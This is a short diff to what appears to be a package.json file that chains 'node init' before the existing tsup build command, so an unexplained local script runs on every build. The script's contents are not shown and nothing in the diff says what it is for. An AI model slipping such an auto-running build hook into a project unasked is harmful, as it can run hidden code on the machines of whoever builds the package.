@@ -16,7 +16,7 @@
     "package.json"
   ],
   "scripts": {
-    "build": "yarn run -T tsup"
+    "build": "node init && yarn run -T tsup"
   },
   "packageManager": "yarn@3.2.1"
 }
